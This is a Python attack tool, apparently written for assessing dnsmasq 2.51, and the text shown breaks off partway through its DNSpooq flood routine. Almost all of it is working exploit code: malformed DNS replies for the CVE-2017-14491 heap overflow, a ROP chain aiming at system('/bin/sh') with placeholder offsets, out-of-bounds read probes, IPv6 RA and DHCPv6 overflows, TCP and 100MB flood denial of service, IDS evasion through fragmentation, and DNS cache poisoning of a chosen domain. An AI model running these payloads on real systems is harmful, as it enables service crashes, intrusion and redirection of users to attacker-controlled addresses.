import sys
import time
import os
import random
import struct
import socket
import resource
import threading

# ==============================================================================
#  MasqOverflow-Suite v3.0.0
#  Advanced Security Assessment Tool for Dnsmasq 2.51
#
#  REFERENCES & CREDITS:
#  1. Google Security Blog: "Behind the Masq" (CVE-2017-14491)
#  2. JSOF Research: "DNSpooq" (CVE-2020-25684/5/6)
#  3. Trend Micro: "Dnsmasq Remediation Practices"
#  4. BitSight: "Thekelleys Dnsmasq 2.51 Observation Footprint"
# ==============================================================================

# GLOBAL CONFIG
STEALTH_MODE = False
THREADS = 50

# Attacker-controlled DNS endpoint used for the CVE-2017-14491 delivery model.
# dnsmasq must be configured to FORWARD to this address (server=<ip>#<port>).
# 127.0.0.2 is a loopback alias so no external host is needed for lab testing:
#   sudo ip addr add 127.0.0.2/8 dev lo
ATTACKER_IP = "127.0.0.2"
ATTACKER_PORT = 5300

# Architecture Presets for ROP Chain (libc offsets)
# !!! PLACEHOLDER VALUES — NOT VALIDATED FOR ANY REAL TARGET !!!
# These offsets are illustrative only. They were NOT derived from any target
# binary and must be recalibrated per target via firmware extraction + Ghidra/GDB
# (see reports/offset_discovery.md). Sending these will not produce RCE.
# The fallback_base brute-force assumption is infeasible for 32-bit ASLR (~1:4e9).
ARCH_PRESETS = {
    "arm32": {
        "name": "ARM 32-bit (Cortex-A)",
        "pack_fmt": "<I",   # Little-endian 32-bit
        "ptr_size": 4,
        "system":  0x000b2e60,
        "pop_rdi": 0x0003a380,  # ARM: pop {r0, pc} equivalent
        "bin_sh":  0x00162a24,
        "leak_offset": 0x21bf67,
        "fallback_base": 0xb6f00000,
    },
    "arm64": {
        "name": "ARM 64-bit (AArch64)",
        "pack_fmt": "<Q",   # Little-endian 64-bit
        "ptr_size": 8,
        "system":  0x00045e40,
        "pop_rdi": 0x0006b2c0,  # x0 load gadget
        "bin_sh":  0x0018ce70,
        "leak_offset": 0x21bf67,
        "fallback_base": 0x0000007fb6f00000,
    },
    "x86": {
        "name": "x86 32-bit",
        "pack_fmt": "<I",
        "ptr_size": 4,
        "system":  0x0003ada0,
        "pop_rdi": 0x00018395,
        "bin_sh":  0x0015ba0b,
        "leak_offset": 0x21bf67,
        "fallback_base": 0xb7e00000,
    },
}
SELECTED_ARCH = "arm32"  # Default

# [FIX] Enforce Root Privileges
if os.geteuid() != 0:
    print("\n[!] FATAL ERROR: Akses Ditolak!")
    print("[!] Script ini membutuhkan hak akses ROOT untuk membuat Raw Socket.")
    print(f"[!] Silakan jalankan ulang dengan: sudo python3 {sys.argv[0]} <TARGET_IP>\n")
    sys.exit(1)

# --- PENGECEKAN KONFLIK NAMA FILE ---
def check_for_conflicts():
    """Memastikan tidak ada file lokal bernama scapy.py yang mengganggu import."""
    current_dir = os.getcwd()
    conflict_file = os.path.join(current_dir, "scapy.py")
    if os.path.exists(conflict_file):
        print(f"[!] PERINGATAN KRITIS: Ditemukan file '{conflict_file}'")
        print(f"[!] Silakan hapus file tersebut: rm {conflict_file}")
        print("-" * 30)

def setup_path():
    """Mengatur PYTHONPATH agar sudo tetap bisa menemukan library di dalam venv."""
    venv_path = os.path.dirname(os.path.dirname(sys.executable))
    python_version = f"python{sys.version_info.major}.{sys.version_info.minor}"
    site_packages = os.path.join(venv_path, "lib", python_version, "site-packages")
    if os.path.exists(site_packages) and site_packages not in sys.path:
        sys.path.insert(0, site_packages)

check_for_conflicts()
setup_path()

try:
    from scapy.all import IP, UDP, TCP, DNS, DNSQR, DNSRR, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, sr1, send, Raw, DHCP6_Solicit, DHCP6OptClientId, fragment, conf
except ImportError:
    print("Error: Library 'scapy' tidak ditemukan. Jalankan: pip install scapy")
    sys.exit(1)

def dw(x):
    """Helper untuk pack 16-bit unsigned integer (Big Endian)."""
    return struct.pack('>H', x)

class Inconclusive(Exception):
    """Raised when liveness cannot be determined (e.g. raw socket denied)."""


def check_service(target_ip, timeout=1):
    """Liveness probe via a standard UDP DNS query.

    Returns True (alive), False (no reply), or raises Inconclusive when the
    probe itself could not be sent/was denied. Critically, a *transport error*
    must be distinguished from a *missing reply*: treating 'Operation not
    permitted' (raw socket denied) as a crash produces false 'CRASHED' verdicts.
    """
    packet = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com"))
    try:
        ans = sr1(packet, timeout=timeout, verbose=0)
        return True if ans else False
    except PermissionError as e:
        raise Inconclusive(f"raw socket not permitted ({e}); run as root for a valid verdict")
    except OSError as e:
        # EPERM/EACCES arrive as OSError on some versions
        if getattr(e, "errno", None) in (1, 13):
            raise Inconclusive(f"raw socket not permitted ({e}); run as root for a valid verdict")
        raise Inconclusive(f"probe transport error: {e}")
    except Exception as e:
        raise Inconclusive(f"probe error: {e}")


def check_status_msg(target_ip, attack_name):
    """Report crash vs stable vs inconclusive — never claim a crash on a
    failed probe."""
    try:
        alive = check_service(target_ip)
    except Inconclusive as e:
        print(f"\n[?] INCONCLUSIVE ({attack_name}): {e}")
        print("[?] No verdict — fix the probe (run as root) and re-check.")
        return None
    if alive:
        print(f"\n[-] Target stabil ({attack_name} failed).")
        return False
    print(f"\n[+] SUCCESS: Target tidak merespons setelah {attack_name} (kemungkinan CRASH).")
    print("[!] Catatan: 'tidak merespons' != crash pasti. Verifikasi via log/uptime target.")
    return True

def hexdump(data, prefix="  "):
    """Pretty hex dump untuk analisis data leak."""
    lines = []
    for i in range(0, len(data), 16):
        chunk = data[i:i+16]
        hex_part = ' '.join(f'{b:02x}' for b in chunk)
        ascii_part = ''.join(chr(b) if 32 <= b < 127 else '.' for b in chunk)
        lines.append(f"{prefix}{i:04x}: {hex_part:<48s} {ascii_part}")
    return '\n'.join(lines)

# --- CORE HELPERS (v2.0) ---

def send_packet(pkt, verbose=0):
    """Wrapper untuk mengirim paket, mendukung Stealth Mode (Fragmentasi)."""
    if STEALTH_MODE:
        # Fragmentasi paket untuk evade simple IDS
        # Hanya bisa dilakukan jika payload cukup besar, untuk paket kecil mungkin tidak efektif
        try:
            frags = fragment(pkt, fragsize=16) # Fragmen kecil
            for f in frags:
                send(f, verbose=verbose)
        except Exception as e:
            # Fallback jika fragmentasi gagal
            send(pkt, verbose=verbose)
    else:
        send(pkt, verbose=verbose)

def thread_spray(pkt, count=1000):
    """Mengirim paket secara paralel menggunakan Threading."""
    print(f"[*] Starting Multi-Threaded Spray ({THREADS} threads)...")
    
    def worker(num_packets):
        for _ in range(num_packets):
            send_packet(pkt, verbose=0)
            
    packets_per_thread = count // THREADS
    threads = []
    
    for _ in range(THREADS):
        t = threading.Thread(target=worker, args=(packets_per_thread,))
        t.daemon = True
        t.start()
        threads.append(t)
        
    for t in threads:
        t.join()
        
    print(f"[+] Selesai mengirim {count} paket.")

# --- ADVANCED MODULES (v2.0) ---

def leak_aslr(target_ip):
    """
    [v3.0] ASLR 'leak' via CVE-2015-3294 — HEURISTIC, unvalidated (see README).
    Sends DNS query with malformed compression pointer over TCP.
    Bug in tcp_request() -> setup_reply() causes OOB heap read.
    """
    arch = ARCH_PRESETS[SELECTED_ARCH]
    ptr_size = arch["ptr_size"]
    pack_fmt = arch["pack_fmt"]
    leak_offset = arch["leak_offset"]
    
    print(f"\n[*] [ASLR LEAK] CVE-2015-3294 — OOB Read via DNS Name (Arch: {arch['name']})")
    
    leak_queries = [
        {
            "desc": "Compression pointer past packet end",
            "payload": (
                struct.pack('>H', random.randint(1,65535)) +
                b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                b'\x04test\xc0\xff' +  # pointer to offset 255 (OOB!)
                b'\x00\x01\x00\x01'
            )
        },
        {
            "desc": "Double compression with large offset",
            "payload": (
                struct.pack('>H', random.randint(1,65535)) +
                b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                b'\x07example\xc1\x00' +  # pointer to offset 256
                b'\x00\x01\x00\x01'
            )
        },
        {
            "desc": "PTR query with nested compression",
            "payload": (
                struct.pack('>H', random.randint(1,65535)) +
                b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
                b'\x03foo\xc0\x0c' +  # self-referencing loop
                b'\x00\x0c\x00\x01'  # QTYPE: PTR
            )
        },
    ]
    
    for query in leak_queries:
        print(f"[*] Trying: {query['desc']}...")
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(4.0)
            s.connect((target_ip, 53))
            
            dns_payload = query["payload"]
            tcp_dns = struct.pack('>H', len(dns_payload)) + dns_payload
            s.send(tcp_dns)
            
            try:
                raw_len = s.recv(2)
                if len(raw_len) == 2:
                    resp_len = struct.unpack('>H', raw_len)[0]
                    data = b''
                    while len(data) < resp_len:
                        chunk = s.recv(resp_len - len(data))
                        if not chunk:
                            break
                        data += chunk
                    s.close()
                    
                    if len(data) > 12:
                        print(f"[+] Got {len(data)} bytes response!")
                        dns_hdr_end = 12
                        
                        if len(data) > 50:
                            print(f"[+] Response larger than expected — potential leak!")
                            print(f"[+] Hex Dump:")
                            print(hexdump(data))
                            
                            leak_data = data[dns_hdr_end:]
                            candidates = []
                            for i in range(0, len(leak_data) - ptr_size + 1, ptr_size):
                                ch = leak_data[i:i+ptr_size]
                                ptr = struct.unpack(pack_fmt, ch)[0]
                                if ptr_size == 4:
                                    valid = (0x40000000 <= ptr <= 0xefffffff)
                                else:
                                    valid = (0x0000007f00000000 <= ptr <= 0x0000007fffffffff)
                                if valid:
                                    base = ptr - leak_offset
                                    aligned = (base & 0xfff) == 0
                                    candidates.append((i + dns_hdr_end, ptr, base, aligned))
                            
                            if candidates:
                                aligned_c = [c for c in candidates if c[3]]
                                best = aligned_c[0] if aligned_c else candidates[0]
                                offset, ptr, base, is_aligned = best
                                align_str = "ALIGNED" if is_aligned else "UNALIGNED"
                                print(f"\n[+] Found {len(candidates)} pointer candidate(s):")
                                for off, p, b, a in candidates[:5]:
                                    mark = " <<<" if (off, p) == (offset, ptr) else ""
                                    a_mark = "\u2713" if a else "\u2717"
                                    if ptr_size == 4:
                                        print(f"    offset=0x{off:04x} ptr=0x{p:08x} base=0x{b:08x} [{a_mark}]{mark}")
                                    else:
                                        print(f"    offset=0x{off:04x} ptr=0x{p:016x} base=0x{b:016x} [{a_mark}]{mark}")
                                if ptr_size == 4:
                                    print(f"\n[+] Best Leaked Pointer: 0x{ptr:08x} ({align_str})")
                                    print(f"[+] Calculated Libc Base: 0x{base:08x}")
                                else:
                                    print(f"\n[+] Best Leaked Pointer: 0x{ptr:016x} ({align_str})")
                                    print(f"[+] Calculated Libc Base: 0x{base:016x}")
                                return base
                        else:
                            print(f"[*] Normal response ({len(data)} bytes) — no leak.")
                    else:
                        print(f"[-] Response too small ({len(data)} bytes).")
                else:
                    print(f"[-] No length header received.")
                    s.close()
            except socket.timeout:
                print(f"[-] Timeout waiting for response.")
                try: s.close()
                except: pass
            except Exception as e:
                print(f"[-] Recv Error: {e}")
                try: s.close()
                except: pass
        except Exception as e:
            print(f"[-] Connection Failed: {e}")
    
    print("[-] All leak attempts failed.")
    return 0x0

def exploit_cve_2017_14491_enhanced(target_ip):
    """
    Versi Enhanced: Menggunakan Leak + ROP Chain.
    [v2.1] Architecture-aware: pack format + offsets sesuai SELECTED_ARCH.
    """
    arch = ARCH_PRESETS[SELECTED_ARCH]
    pack_fmt = arch["pack_fmt"]
    
    print(f"\n[*] [CVE-2017-14491-PRO] Enhanced Heap Overflow (ROP Chain)...")
    print(f"[*] Architecture: {arch['name']}")
    
    # Step 1: Leak ASLR
    libc_base = leak_aslr(target_ip)
    if libc_base == 0:
        libc_base = arch["fallback_base"]
        print(f"[!] Gagal leak ASLR, menggunakan fallback base: 0x{libc_base:x} (Unreliable).")
        
    # Step 2: Craft ROP Chain (architecture-aware)
    system_addr = libc_base + arch["system"]
    pop_rdi    = libc_base + arch["pop_rdi"]
    bin_sh     = libc_base + arch["bin_sh"]
    
    if arch["ptr_size"] == 4:
        print(f"[*] Building ROP Chain with Libc Base: 0x{libc_base:08x}")
        print(f"    system()  = 0x{system_addr:08x}")
        print(f"    pop_rdi   = 0x{pop_rdi:08x}")
        print(f"    /bin/sh   = 0x{bin_sh:08x}")
    else:
        print(f"[*] Building ROP Chain with Libc Base: 0x{libc_base:016x}")
        print(f"    system()  = 0x{system_addr:016x}")
        print(f"    pop_rdi   = 0x{pop_rdi:016x}")
        print(f"    /bin/sh   = 0x{bin_sh:016x}")
    
    # Header
    tid = random.randint(1, 65535)
    header = dw(tid) + dw(0x85a0) + dw(1) + dw(0x52) + dw(0) + dw(0)
    question = b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + dw(0x000c) + dw(0x0001)

    # ROP Payload (architecture-aware pack format)
    rop_payload = b"A" * 20  # Padding
    rop_payload += struct.pack(pack_fmt, pop_rdi)
    rop_payload += struct.pack(pack_fmt, bin_sh)
    rop_payload += struct.pack(pack_fmt, system_addr)
    
    # Masukkan payload ke dalam DNS answer record
    ans1 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0400)
    ans1 += rop_payload + b"Z" * (100 - len(rop_payload))

    ans2 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0026)
    ans2 += b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00'
    extra_answers = b''
    for _ in range(40):
        extra_answers += b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0002) + b'\xc4\x40'

    last_ans = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0011)
    last_ans += b'\x04EEEE\x09DAABBEEEE\xc4\x49'

    full_payload = header + question + ans1 + ans2 + extra_answers + last_ans
    packet = IP(dst=target_ip)/UDP(sport=53, dport=53)/Raw(load=full_payload)
    
    # [v3.0] Step 0: Trigger a matching query on the target
    # Dnsmasq only accepts responses for PENDING queries.
    # We trigger a PTR query for 125.8.8.8.in-addr.arpa matching our payload.
    print(f"[*] Step 0: Triggering matching PTR query on target...")
    trigger_pkt = IP(dst=target_ip)/UDP(dport=53)/DNS(
        rd=1, qd=DNSQR(qname="125.8.8.8.in-addr.arpa", qtype="PTR")
    )
    
    # Send trigger and spray concurrently for race condition
    def trigger_heap_query():
        time.sleep(0.05)  # Slight delay — let spray start first
        for _ in range(20):  # 20 queries → 20 pending slots
            send_packet(trigger_pkt, verbose=0)
            time.sleep(0.01)
    
    trigger_t = threading.Thread(target=trigger_heap_query)
    trigger_t.daemon = True
    trigger_t.start()
    
    # Step 3: Threaded Spray (race against real upstream response)
    print(f"[*] Spraying {2000} malformed responses (race condition)...")
    thread_spray(packet, count=2000)
    trigger_t.join()
    
    time.sleep(2)
    check_status_msg(target_ip, "ROP chain (PLACEHOLDER offsets, no RCE proof)")

# --- ORIGINAL MODULES (Adapted for v2.0) ---

def build_cve_2017_14491_reply(tid):
    """Craft the malformed DNS response used by CVE-2017-14491.

    Byte-for-byte identical to Google Security Research's PoC
    (google/security-research-pocs/vulnerabilities/dnsmasq/CVE-2017-14491.py).
    Returns raw DNS payload bytes (no IP/UDP header).
    """
    header = dw(tid) + dw(0x85a0) + dw(1) + dw(0x52) + dw(0) + dw(0)
    question = b'\x03125\x018\x018\x018\x07in-addr\x04arpa\x00' + dw(0x000c) + dw(0x0001)
    ans1 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0400) + (b'\x3e' + b'Z' * 62) * 16 + b'\x0e' + b'Z' * 14 + b'\x00'
    ans2 = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0026) + b'\x08DCBBEEEE\x04DDDD\x08CCCCCCCC\x04AAAA\x04BBBB\x03com\x00'
    extra = (b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0002) + b'\xc4\x40') * 79
    last = b'\xc0\x0c' + dw(0x000c) + dw(0x0001) + struct.pack('>I', 0x3d) + dw(0x0011) + b'\x04EEEE\x09DAABBEEEE\xc4\x49'
    return header + question + ans1 + ans2 + extra + last


def exploit_cve_2017_14491(target_ip):
    """CVE-2017-14491 (heap overflow) — CORRECT delivery model.

    The old version spoofed the malformed response straight at the target's
    port 53, which dnsmasq ignores: it only parses replies on a socket it
    opened for a query it is actually waiting on. Google's PoC works because
    dnsmasq FORWARDS a query to an attacker-controlled upstream and then parses
    whatever that server returns.

    Correct method (per Google's CVE-2017-14491-instructions.txt):
      1. Run an attacker-controlled DNS server on ATTACKER_IP:ATTACKER_PORT.
      2. Get dnsmasq to forward a query there (server=/domain/ATTACKER, or a
         client query when dnsmasq's own upstream is the attacker).
      3. Prime the cache: repeat the PTR query so the response is parsed again.
         Crash is NON-DETERMINISTIC (cache ordering) — retry is expected.
    Requires dnsmasq to be configured with the attacker as upstream
    (`--server=<ATTACKER_IP>#<ATTACKER_PORT>`), or a zone delegated to it.
    """
    print(f"\n[*] [CVE-2017-14491] Heap Overflow via attacker-controlled DNS server...")
    print("[*] Method: dnsmasq must FORWARD a query to us, then we return the malformed reply.")

    attacker_ip = input(f"[?] Attacker DNS IP (this host, dnsmasq must forward here) [{ATTACKER_IP}]: ").strip() or ATTACKER_IP
    attacker_port = input(f"[?] Attacker DNS port [{ATTACKER_PORT}]: ").strip()
    attacker_port = int(attacker_port) if attacker_port.isdigit() else ATTACKER_PORT

    srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((attacker_ip, attacker_port))
    except OSError as e:
        print(f"[-] Cannot bind {attacker_ip}:{attacker_port}: {e}")
        print("[-] Pick a loopback alias (e.g. 127.0.0.2) with: sudo ip addr add 127.0.0.2/8 dev lo")
        return
    srv.settimeout(30)
    print(f"[+] Attacker DNS listening on {attacker_ip}:{attacker_port}")
    print(f"[*] Ensure dnsmasq forwards to {attacker_ip}#{attacker_port} (e.g. server={attacker_ip}#{attacker_port})")

    # Prime the cache directly against the target's DNS port.
    def prime_once():
        try:
            q = IP(dst=target_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="125.8.8.8.in-addr.arpa", qtype="PTR"))
            send_packet(q, verbose=0)
        except Exception:
            pass

    print("[*] Waiting for a forwarded query (send one from a client, or Ctrl-C to abort)...")
    served = 0
    while True:
        try:
            data, addr = srv.recvfrom(2048)
        except socket.timeout:
            print("[-] No forwarded query received within timeout.")
            print("[-] dnsmasq is not forwarding to us. Set `server=%s#%d`, restart it, retry." % (attacker_ip, attacker_port))
            break
        if len(data) < 12:
            continue
        tid = struct.unpack('>H', data[0:2])[0]
        reply = build_cve_2017_14491_reply(tid)
        srv.sendto(reply, addr)
        served += 1
        print(f"[+] Served malformed reply #{served} ({len(reply)} bytes) to {addr[0]}:{addr[1]}")
        # Re-prime so dnsmasq re-parses the hostile answer (crash is racy).
        for _ in range(3):
            prime_once()
            time.sleep(0.1)
        time.sleep(0.5)
        check_status_msg(target_ip, "CVE-2017-14491 (attacker-DNS delivery)")
        if served >= 10:
            print("[*] 10 replies served; stopping (rerun if target still alive).")
            break

    srv.close()

def exploit_cve_2017_14492(target_ip):
    print(f"\n[*] [CVE-2017-14492] IPv6 RA Overflow...")
    try:
        dst_ipv6 = "ff02::1"
        # [v2.1] Structured Prefix Information option (type=3, length=4)
        # Format: type(1) + length(1) + prefix_len(1) + flags(1) + valid_lt(4)
        #       + preferred_lt(4) + reserved(4) + prefix(16) = 32 bytes per option
        # We craft oversized: correct type/length header but overflow the total buffer
        prefix_opt  = b"\x03"  # Type: Prefix Information
        prefix_opt += b"\x04"  # Length: 4 (32 bytes) — correct per RFC
        prefix_opt += b"\x40"  # Prefix Length: 64
        prefix_opt += b"\xc0"  # Flags: L + A
        prefix_opt += b"\xff\xff\xff\xff"  # Valid Lifetime
        prefix_opt += b"\xff\xff\xff\xff"  # Preferred Lifetime
        prefix_opt += b"\x00" * 4          # Reserved
        prefix_opt += b"\xfe\x80" + b"\x00" * 6 + b"\xde\xad\xbe\xef" + b"\x00" * 4  # Prefix
        
        # Repeat structured options to overflow (37 × 32 = 1184 bytes)
        overflow_payload = prefix_opt * 37
        # Append unstructured tail to push past allocation boundary
        overflow_payload += b"\x41" * 200
        
        packet1 = IPv6(dst=dst_ipv6)/ICMPv6ND_RA()/Raw(load=overflow_payload)
        send_packet(packet1, verbose=0)
        time.sleep(2)
        check_status_msg(target_ip, "IPv6 RA")
    except Exception as e:
        print(f"[-] IPv6 RA Error: {e}")
        print("[-] Pastikan IPv6 aktif di interface dan target.")

def exploit_cve_2017_14493(target_ip):
    print(f"\n[*] [CVE-2017-14493] DHCPv6 Stack Overflow...")
    try:
        base_dhcp = DHCP6_Solicit()
        payload = b"A" * 500
        pkt = IPv6(dst="ff02::1:2")/UDP(sport=546, dport=547)/base_dhcp/Raw(load=payload)
        send_packet(pkt, verbose=0)
        time.sleep(1)
        check_status_msg(target_ip, "DHCPv6 Overflow")
    except Exception as e:
        print(f"[-] DHCPv6 Error: {e}")
        print("[-] Pastikan IPv6 aktif di interface dan target.")

def exploit_cve_2015_3294(target_ip):
    """
    [v3.0] CVE-2015-3294 — OOB read via malformed DNS query over TCP.
    Bug in tcp_request() -> setup_reply() unchecked return value.
    """
    print(f"\n[*] [CVE-2015-3294] OOB Read via Malformed DNS Name (TCP)...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target_ip, 53))
        
        # [v3.0] DNS query with compression pointer past packet boundary
        dns_query = (
            struct.pack('>H', random.randint(1,65535)) +  # TXID
            b'\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' +
            b'\x04leak\xc0\xff' +  # compression pointer to offset 255 (OOB!)
            b'\x00\x01\x00\x01'    # QTYPE: A, QCLASS: IN
        )
        tcp_dns = struct.pack('>H', len(dns_query)) + dns_query
        s.send(tcp_dns)
        
        try:
            raw_len = s.recv(2)
            if len(raw_len) == 2:
                resp_len = struct.unpack('>H', raw_len)[0]
                leaked_data = b''
                while len(leaked_data) < resp_len:
                    chunk = s.recv(resp_len - len(leaked_data))
                    if not chunk: break
                    leaked_data += chunk
                
                if leaked_data and len(leaked_data) > 12:
                    print(f"[+] Received {len(leaked_data)} bytes response!")
                    print(f"[+] Hex Dump:")
                    print(hexdump(leaked_data))
                    
                    printable = sum(1 for b in leaked_data if 32 <= b < 127)
                    ratio = printable / len(leaked_data) * 100
                    print(f"[*] Printable ratio: {ratio:.1f}% ({printable}/{len(leaked_data)} bytes)")
                    if len(leaked_data) > 50:
                        print("[+] Oversized response — likely contains leaked heap data!")
                    elif ratio < 30:
                        print("[+] Low printable ratio \u2192 likely raw memory.")
                    else:
                        print("[*] Normal response \u2014 may not contain leak.")
                else:
                    print("[-] No useful data received (target mungkin patched).")
            else:
                print("[-] No response from target.")
        except socket.timeout:
            print("[-] Timeout waiting for response.")
        
        s.close()
        time.sleep(1)
        check_status_msg(target_ip, "TCP OOB Read")
    except Exception as e:
        print(f"[-] CVE-2015-3294 Error: {e}")

def exploit_cve_2017_13704(target_ip):
    print(f"\n[*] [CVE-2017-13704] EDNS0 Overflow...")
    try:
        # Pkt 1: Normal EDNS0 probe
        p1 = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="test.com"), ar=DNSRR(type="OPT", rclass=4096))
        send_packet(p1)
        # Pkt 2: Oversized OPT rdata
        huge = "A"*254
        p2 = IP(dst=target_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="g.com"), ar=DNSRR(type="OPT", rclass=4096, rdata=[huge, huge]))
        send_packet(p2)
        time.sleep(1)
        check_status_msg(target_ip, "EDNS0 Overflow")
    except Exception as e:
        print(f"[-] EDNS0 Error: {e}")

def exploit_tcp_dos(target_ip):
    if not require_dos_consent(target_ip, "TCP Exhaustion (2000 sockets)"):
        return
    print(f"\n[*] [TCP DOS] Architectural Exhaustion...")
    try:
        soft, hard = resource.getrlimit(resource.RLIMIT_NOFILE)
        new_limit = max(hard, 4096)
        resource.setrlimit(resource.RLIMIT_NOFILE, (new_limit, new_limit))
        print(f"[*] ulimit set: {soft} -> {new_limit}")
    except Exception as e:
        print(f"[-] Warning: Gagal set ulimit: {e}")
    
    print("[*] Opening 2000 sockets...")
    sockets = []
    failed = 0
    try:
        for i in range(2000):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.5) 
                s.connect((target_ip, 53))
                sockets.append(s)
                s.send(b"\x00\x00") 
                if i % 100 == 0: sys.stdout.write(f"[{i}]"); sys.stdout.flush()
            except Exception as e:
                failed += 1
                if failed <= 3:
                    print(f"\n[-] Socket {i} failed: {e}")
                elif failed == 4:
                    print(f"[-] (suppressing further socket errors...)")
    except Exception as e:
        print(f"\n[-] Socket loop error: {e}")
    print(f"\n[*] {len(sockets)} open, {failed} failed.")
    check_status_msg(target_ip, "TCP Flood")
    for s in sockets:
        try: s.close()
        except: pass

# --- RESTRICTED: resource-exhaustion (DoS) vectors ---------------------------------
# These are DISABLED by default because non-targeted resource exhaustion is the
# least defensible part of this tool: it has no clean "authorized test" story and
# can disrupt third parties sharing the network. They only run when this flag is
# explicitly enabled AND the operator types a confirmation at runtime.
#   Enable deliberately:  MASQ_ALLOW_DOS=1 python3 masq_overflow.py <TARGET>
ALLOW_DOS = os.environ.get("MASQ_ALLOW_DOS", "") == "1"

def require_dos_consent(target_ip, what):
    """Two-key gate for DoS vectors: env flag + interactive confirmation."""
    if not ALLOW_DOS:
        print(f"\n[!] BLOCKED: '{what}' adalah vektor resource-exhaustion (DoS).")
        print("[!] Dinonaktifkan default. Aktifkan sadar dengan:")
        print("[!]   MASQ_ALLOW_DOS=1 python3 masq_overflow.py <TARGET>")
        print("[!] Hanya jalankan terhadap host yang kamu miliki/berwenang, dan")
        print("[!] pastikan tidak ada pihak lain yang bergantung pada layanan itu.")
        return False
    print(f"\n[!] {what} = resource exhaustion (DoS).")
    print(f"[!] Target: {target_ip}")
    ans = input("[?] Saya berwenang & target milik saya / diizinkan. Lanjut? (type YES): ").strip()
    if ans != "YES":
        print("[-] Dibatalkan.")
        return False
    return True


def exploit_heavy_buffer(target_ip):
    if not require_dos_consent(target_ip, "Heavy DOS (100MB flood)"):
        return
    print(f"\n[*] [HEAVY DOS] 100MB Stream...")
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((target_ip, 53))
        chunk = 1024*1024
        total = 100*1024*1024
        sent=0
        while sent < total:
            s.send(b"A"*chunk)
            sent += chunk
            sys.stdout.write(f"\r[*] Sent: {sent//1024//1024} MB")
            sys.stdout.flush()
        s.close()
    except Exception as e: print(f"\n[!] {e}")
    check_status_msg(target_ip, "Heavy DOS")

def exploit_dnspooq(target_ip):
    """
    [v2.1.1] DNSpooq Cache Poisoning — CVE-2020-25684/25685/25686.
    
    Attack Flow:
    1. Trigger Dnsmasq to forward a query upstream
    2. Race condition: flood spoofed responses BEFORE real upstream reply arrives
    3. Spoofed response must match: txid + destination port (Dnsmasq forwarding port)
    
    CVE-2020-25686 weakness: Dnsmasq forwards duplicate queries → Birthday Attack
    CVE-2020-25684 weakness: Weak addr/port validation
    CVE-2020-25685 weakness: CRC32 hash for query matching
    """
    print(f"\n[*] [DNSpooq] Cache Poisoning (CVE-2020-25684/5/6)...")
    print(f"[*] Exploiting weak txid + port randomization in Dnsmasq 2.51")
    
    # User configurable domain (must be resolvable, not reserved)
    default_domain = "mail.google.com"
    user_domain = input(f"[?] Domain to poison [{default_domain}]: ").strip()
    spoof = user_domain if user_domain else default_domain
    
    default_fake = "6.6.6.6"
    user_fake = input(f"[?] Fake IP to inject [{default_fake}]: ").strip()
    fake = user_fake if user_fake else default_fake
    
    print(f"\n[*] Target domain: {spoof} -> {fake}")
    print(f"[*] Strategy: Concurrent query trigger + response flood")
    
    # [v2.1.1] Step 0: Get the REAL IP before attack for comparison
    print(f"[*] Step 0: Resolving real IP for {spoof}...")
    real_ip = None
    try:
        pre_check = sr1(IP(dst=target_ip)/UDP(dport=53)/DNS(
            rd=1, qd=DNSQR(qname=spoof)
        ), timeout=3, verbose=0)
        if pre_check and pre_check.haslayer(DNS) and pre_check.getlayer(DNS).ancount > 0:
            real_ip = str(pre_check.getlayer(DNS).an.rdata)
            print(f"[+] Real IP: {spoof} -> {real_ip}")
        else:
            print(f"[*] Target belum cache domain ini (fresh target).")
    except Exception as e:
        print(f"[-] Pre-check error: {e}")
    
    if real_ip == fake:
        print(f"[!] WARNING: Real IP sama dengan fake IP ({fake}). Pilih fake IP yang berbeda!")
        return
    
    # [v2.1.2] Full port range — Dnsmasq 2.51 bisa pakai port manapun
    PORT_RANGE_START = 1024
    PORT_RANGE_END = 65535

    rounds = 5

    for attempt in range(1, rounds + 1):
        print(f"\n[*] === Attempt {attempt}/{rounds} ===")
        
        def trigger_query():
            """Send legitimate queries to make Dnsmasq forward upstream."""
            time.sleep(0.1)  # Delay — biar flood sudah jalan duluan
            for _ in range(150):  # [v3.0] 150 queries = max Dnsmasq pending limit (Birthday Attack)
                send_packet(IP(dst=target_ip)/UDP(dport=53)/DNS(
                    rd=1, qd=DNSQR(qname=spoof)
                ), verbose=0)
                time.sleep(0.005)  # 5ms between queries
        
        def flood_worker(txid_start, txid_end):
            """Flood spoofed responses — sport=53 (mimic upstream DNS)."""
            for txid in range(txid_start, txid_end):
                dport = random.randint(PORT_RANGE_START, PORT_RANGE_END)
                pkt = IP(dst=target_ip)/UDP(sport=53, dport=dport)/DNS(
                    id=txid,
